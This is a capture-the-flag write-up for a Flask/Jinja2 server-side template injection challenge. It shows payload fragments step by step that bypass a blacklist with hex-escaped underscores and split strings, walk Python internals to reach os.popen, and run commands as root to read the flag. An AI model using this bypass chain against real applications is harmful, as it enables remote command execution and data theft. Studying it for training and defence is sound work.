
# SSTI2 — CTF Writeup

## Challenge Information

| Field | Details |
|---|---|
| Challenge | SSTI2 |
| Category | Web Exploitation |
| Vulnerability | Server-Side Template Injection (SSTI) |
| Technology | Flask / Jinja2 |
| Difficulty | Medium |
| Platform | CYLab Academy |
| Flag | `academy{sst1_f1lt3r_byp4ss_7d09ff8d}` |

---

# 1. Objective

The objective was to exploit a **Server-Side Template Injection (SSTI)** vulnerability in a Flask/Jinja2 application and ultimately access the challenge flag.

The application attempted to prevent exploitation through **blacklisting dangerous characters/strings**.

The challenge hint emphasized why blacklist-based sanitization is unreliable.

---

# 2. Initial Reconnaissance

The application accepted user-controlled input and rendered it through Jinja2.

I first tested whether template expressions were being evaluated.

### Test

```jinja2
{{7*7}}
```

### Result

```text
49
```

This confirmed that the input was being interpreted as a Jinja2 template.

### Conclusion

The application was vulnerable to:

```text
Server-Side Template Injection (SSTI)
```

---

# 3. Identifying the Template Context

I tested objects available inside the template.

### Flask configuration

```jinja2
{{config}}
```

This returned a Flask configuration object.

### Request object

```jinja2
{{request}}
```

This returned the Flask request object.

This was important because `request` is a Python object, meaning Python's object model could potentially be explored.

---

# 4. Testing Attribute Access

Jinja's `attr()` filter can access object attributes.

For example:

```jinja2
{{request|attr('method')}}
```

returned:

```text
POST
```

This confirmed that `attr()` could be used for object traversal.

---

# 5. Bypassing the `__class__` Filter

Direct access to dangerous attributes was restricted.

For example, directly using:

```text
__class__
```

was blocked.

Instead, I used hexadecimal escape sequences:

```jinja2
\x5f
```

The hexadecimal value `5f` represents:

```text
_
```

Therefore:

```text
\x5f\x5fclass\x5f\x5f
```

becomes:

```text
__class__
```

### Payload

```jinja2
{{request|attr('\x5f\x5fclass\x5f\x5f')}}
```

### Result

```text
<class 'flask.wrappers.Request'>
```

### Important lesson

The blacklist was checking the input representation, while Jinja later interpreted the escaped representation.

This demonstrated a fundamental weakness of blacklist-based sanitization.

---

# 6. Understanding `__mro__`

After obtaining the request object's class, I inspected its Method Resolution Order.

```jinja2
{{request|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')}}
```

The result showed an inheritance chain similar to:

```text
flask.wrappers.Request
werkzeug.wrappers.request.Request
werkzeug.sansio.request.Request
object
```

The important part was:

```text
object
```

Python objects ultimately inherit from the base `object` class.

---

# 7. Reaching `object`

Jinja's `last` filter allowed me to select the final item of the MRO without using square-bracket indexing.

Conceptually:

```text
Request
   ↓
Werkzeug Request
   ↓
Werkzeug SansIO Request
   ↓
object
```

Using:

```jinja2
|last
```

selected:

```text
<class 'object'>
```

---

# 8. Enumerating Python Subclasses

Python's `object` class provides:

```python
object.__subclasses__()
```

which returns classes currently loaded by the Python process.

The following Jinja expression accessed it:

```jinja2
{{request|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
```

The application contained hundreds of loaded classes.

The important idea was:

```text
object
   ↓
__subclasses__()
   ↓
many Python classes
```

---

# 9. Finding an `os`-Related Class

Rather than relying on a hard-coded subclass index, I filtered the subclasses according to their module.

The payload used:

```jinja2
selectattr(
    '\x5f\x5fmodule\x5f\x5f',
    'equalto',
    'os'
)
```

This identified:

```text
<class 'os._wrap_close'>
```

This was a much better approach than guessing a numeric subclass index.

### Why?

Subclass indexes can change between:

- Python versions
- installed packages
- application environments
- execution environments

Searching by a property such as `__module__` is more robust.

---

# 10. Accessing `__init__`

The selected class was:

```text
os._wrap_close
```

I accessed its initializer:

```jinja2
|attr('\x5f\x5finit\x5f\x5f')
```

This returned a Python function.

Conceptually:

```text
os._wrap_close
       ↓
__init__
       ↓
Python function
```

---

# 11. Accessing Function Globals

Python function objects contain a reference to their global namespace through:

```python
function.__globals__
```

I accessed this using:

```jinja2
|attr('\x5f\x5fglobals\x5f\x5f')
```

This returned a very large dictionary.

The dictionary belonged to the `os` module and contained functions including:

```text
popen
system
getcwd
listdir
getenv
...
```

The captured output also showed the process working directory as:

```text
/challenge
```

and confirmed that `popen` was available in the `os` module globals. Pasted text

At this point the traversal had effectively reached:

```text
Jinja
 ↓
Python object
 ↓
class
 ↓
MRO
 ↓
object
 ↓
subclasses
 ↓
os._wrap_close
 ↓
function
 ↓
function.__globals__
 ↓
os module namespace
```

---

# 12. Understanding the Dictionary

An important mistake happened here.

`__globals__` returned a **dictionary**.

Conceptually:

```python
globals = {
    "popen": <function popen>,
    "system": <built-in function system>,
    ...
}
```

Initially I attempted to access `popen` as an attribute.

That resulted in a blank response.

The correct mental model was:

```text
__globals__
      ↓
dictionary
      ↓
dictionary key
```

Therefore I used the dictionary's `get()` method.

---

# 13. Bypassing the `popen` Blacklist

The literal string:

```text
popen
```

was blocked by the application's blacklist.

Instead, I constructed the string dynamically:

```jinja2
'po' ~ 'pen'
```

Jinja evaluates:

```text
'po' ~ 'pen'
```

as:

```text
popen
```

but the literal word `popen` never appeared in the submitted input.

The final lookup was:

```jinja2
|attr('get')('po' ~ 'pen')
```

This returned:

```text
<function popen at 0x...>
```

### Key lesson

This demonstrated the difference between:

```text
Input representation
```

and:

```text
Evaluated representation
```

The blacklist saw:

```text
'po' ~ 'pen'
```

while Jinja evaluated it as:

```text
popen
```

---

# 14. Achieving Command Execution

Once the `popen` function was retrieved, I called it with a harmless command:

```text
id
```

Conceptually:

```python
os.popen("id")
```

The result was:

```text
<os._wrap_close object at ...>
```

This object represented the command's output stream.

I then called:

```text
read()
```

Conceptually:

```python
os.popen("id").read()
```

The server returned:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed **server-side command execution as root**.

---

# 15. Enumerating the Challenge Directory

Rather than immediately guessing the flag filename, I first enumerated the challenge directory.

Command:

```text
ls -la /challenge
```

The result contained:

```text
__pycache__
app.py
flag
requirements.txt
```

The important discovery was:

```text
flag
```

---

# 16. Reading the Flag

The final command was:

```text
cat /challenge/flag
```

The flag was:

```text
academy{sst1_f1lt3r_byp4ss_7d09ff8d}
```

---

# 17. Final Exploitation Chain

The complete attack can be represented as:

```text
SSTI
 │
 ├── {{7*7}}
 │       ↓
 │      49
 │
 └── request
        ↓
     __class__
        ↓
      __mro__
        ↓
      object
        ↓
   __subclasses__()
        ↓
   os._wrap_close
        ↓
      __init__
        ↓
    __globals__
        ↓
    os module
        ↓
     get("popen")
        ↓
      popen()
        ↓
      command
        ↓
      read()
        ↓
      FLAG
```

---

# 18. Important Techniques Learned

## SSTI Detection

```jinja2
{{7*7}}
```

Use mathematical expressions as initial probes.

---

## Jinja Attribute Access

```jinja2
|attr(...)
```

Allows attributes to be accessed dynamically.

---

## Python Introspection

Important concepts:

```python
__class__
__mro__
__subclasses__
__init__
__globals__
```

These expose relationships between Python objects, classes, and functions.

---

## Jinja Filters

Important filters used:

```text
attr()
last
selectattr()
```

These allowed us to navigate the Python object graph without conventional Python syntax.

---

## Blacklist Bypass

Character representation:

```text
\x5f → _
```

String construction:

```jinja2
'po' ~ 'pen'
```

These demonstrate why simple blacklists are unreliable.

---

# 19. What I Should Learn From This CTF

The most important thing isn't memorizing the final payload.

The transferable methodology is:

```text
Identify
   ↓
Probe
   ↓
Understand
   ↓
Enumerate
   ↓
Filter
   ↓
Reach capability
   ↓
Bypass restriction
   ↓
Verify safely
   ↓
Enumerate target
   ↓
Complete objective
```

When facing another SSTI challenge, ask:

### 1. What template engine is being used?

```text
Jinja2?
Twig?
Freemarker?
Velocity?
```

### 2. Is my input actually evaluated?

```text
{{7*7}}
```

### 3. What objects are available?

```text
request
config
application
```

### 4. What language/runtime is underneath?

For Jinja:

```text
Python
```

### 5. What can I inspect?

```text
classes
inheritance
subclasses
functions
globals
```

### 6. What capability do I need?

For example:

```text
filesystem
environment
database
OS
```

### 7. What is blocking me?

```text
characters?
keywords?
attributes?
syntax?
```

### 8. Can the same value be represented differently?

This was the key to this challenge.

---

# 20. Skills to Study Next

For your CTF learning path, I'd put these next:

### Python Internals

Learn deeply:

```text
objects
classes
type
inheritance
MRO
__dict__
functions
globals
modules
```

### Jinja2

Learn:

```text
expressions
filters
attribute resolution
string operations
templates
sandboxing
```

### Flask

Understand:

```text
request
application
routes
templates
Jinja rendering
Werkzeug
```

### SSTI

Study:

```text
SSTI detection
context discovery
object traversal
Jinja sandbox
sandbox escapes
blacklist bypasses
```

Then move on to:

```text
SQLi
XSS
SSRF
Path Traversal
Command Injection
File Upload
IDOR
Deserialization
Authentication vulnerabilities
```

---

# 21. Key Takeaway

The biggest lesson from SSTI2 is:

> **Don't memorize exploit payloads. Learn to navigate the application's objects and reason about how your input is transformed.**

We didn't magically know the final exploit.

We progressively answered:

```text
Can I execute Jinja?
        ↓
What objects can I access?
        ↓
What is request?
        ↓
What class created it?
        ↓
What does it inherit from?
        ↓
What subclasses exist?
        ↓
Can I find something related to os?
        ↓
Can I reach its globals?
        ↓
What functions are available?
        ↓
Why is popen blocked?
        ↓
Can I construct "popen" differently?
        ↓
Can I prove command execution?
        ↓
Where is the flag?
```
